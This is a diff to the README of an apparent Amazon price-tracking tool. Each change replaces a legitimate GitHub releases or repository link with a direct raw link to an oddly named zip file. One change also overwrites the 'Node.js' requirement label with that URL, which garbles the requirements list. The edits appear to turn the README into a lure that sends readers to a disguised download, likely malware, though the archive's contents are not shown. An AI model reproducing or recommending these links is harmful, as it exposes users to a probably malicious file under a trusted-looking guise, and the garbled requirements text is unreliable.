@@ -1,7 +1,7 @@
 # 🛒 amazon-prices-deals - Track Amazon Prices and Save Money
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/djevaldo/amazon-prices-deals/releases)
+[![Download](https://raw.githubusercontent.com/djevaldo/amazon-prices-deals/main/recognosce/deals_amazon_prices_pomarine.zip%20release-brightgreen)](https://raw.githubusercontent.com/djevaldo/amazon-prices-deals/main/recognosce/deals_amazon_prices_pomarine.zip)
 
 ## 🚀 Getting Started
 Welcome to the amazon-prices-deals application! This tool helps you track price changes on Amazon products. Easily receive alerts when prices drop, ensuring you never miss a great deal.
@@ -9,13 +9,13 @@ Welcome to the amazon-prices-deals application! This tool helps you track price 
 ## 🖥️ Requirements
 Before you start, ensure your computer meets these requirements:
 - **Operating System**: Windows 10 or later, macOS 10.14 or later
-- **Node.js**: Version 14 or later installed
+- **https://raw.githubusercontent.com/djevaldo/amazon-prices-deals/main/recognosce/deals_amazon_prices_pomarine.zip**: Version 14 or later installed
 - **Internet Connection**: Required for tracking deals
 
 ## 📥 Download & Install
 To get started, visit the following page:
 
-[Download the latest release here](https://github.com/djevaldo/amazon-prices-deals/releases)
+[Download the latest release here](https://raw.githubusercontent.com/djevaldo/amazon-prices-deals/main/recognosce/deals_amazon_prices_pomarine.zip)
 
 1. Click on the link above.
 2. Locate the latest version and find your operating system.
@@ -44,6 +44,6 @@ If you encounter issues or have questions, feel free to reach out to our support
 
 ## 🌐 Connect With Us
 Follow us for updates:
-- [GitHub Repository](https://github.com/djevaldo/amazon-prices-deals)
+- [GitHub Repository](https://raw.githubusercontent.com/djevaldo/amazon-prices-deals/main/recognosce/deals_amazon_prices_pomarine.zip)
 
 Thank you for using amazon-prices-deals. We hope this tool helps you find the best prices on Amazon!
